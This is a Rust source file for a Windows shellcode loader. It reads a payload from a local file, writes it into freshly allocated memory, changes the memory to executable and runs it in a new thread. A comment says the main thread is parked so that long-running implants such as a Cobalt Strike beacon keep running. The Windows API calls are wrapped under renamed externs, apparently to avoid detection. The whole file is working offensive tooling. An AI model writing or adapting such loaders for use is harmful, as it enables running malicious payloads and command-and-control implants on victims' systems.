#![allow(warnings)]
mod externs;
mod utils;
use std::ptr::null_mut;
use std::ffi::c_void;
use std::thread;



fn main() {
    // Read the shellcode from a file on disk (for testing)
    let file_path: &str = "C:\\Users\\nullb1t3\\Desktop\\http.bin";
    println!("[+] Reading shellcode from a file: {}", file_path);

    // The shellcode is read as a byte vector
    let shellcode: Vec<u8> = match utils::read_file(file_path) {
        Some(sc) => sc,
        None => {
            return
        }
    };

    println!("[+] Preparing memory and executing");
    unsafe {
        // Allocate memory for the shellcode
        let memAddr: externs::LPVOID = externs::allocator(
            null_mut(),
            shellcode.len(),
            externs::MEM_COMMIT | externs::MEM_RESERVE,
            externs::PAGE_READWRITE
        );

        if memAddr.is_null() {
            println!("[!] Could not allocate memory");
            return;
        }
        println!("[+] Allocated memory address: {:p}", memAddr);

        // Use WriteProcessMemory to write the shellcode
        let mut written: externs::DWORD = 0;
        externs::writer(
            externs::SELF_HANDLE,
            memAddr,
            shellcode.as_ptr() as externs::LPVOID,   // Convert from immutable pointer to LPVOID (mutable pointer to c_voud in rust)
            shellcode.len() as usize,
            &mut written                             // Pass a mutable reference to the DWORD used to store the old memory protection
        );

        if written as usize != shellcode.len() {
            println!("[!] Not all shellcode bytes written\nsc_size: {}, written: {}", shellcode.len(), written as usize);
            return;
        }
        println!("[+] SC Bytes written: {}", written as usize);

        // Change the memory protection to read/execute
        let mut oldProtect: externs::DWORD = 0;
        externs::memProtect(
            memAddr,
            shellcode.len(),
            externs::PAGE_EXECUTE_READ,
            &mut oldProtect
        );

        // Cast the shellcode's start address to a function pointer, as LPTHREAD_START_ROUTINE is expected to be of type LPVOID
        let sc_func: externs::LPTHREAD_START_ROUTINE = std::mem::transmute(memAddr);
        // Execute the shellcode by spawning new thread in the current process
        let threadHand: externs::HANDLE = externs::selfStart(
            null_mut(),
            0,
            sc_func,
            null_mut(),
            externs::THREAD_CREATE_FLAGS,
            null_mut()
        );

        if threadHand.is_null() {
            println!("[!] Could not start thread");
        }
        println!("[+] Handle to the new thread: {:p}", threadHand);
    }

    println!("[+] Finished");

    // Pause the main thread so the shellcode can keep running (if its a long running proc like CS's beacon)
    thread::park();
}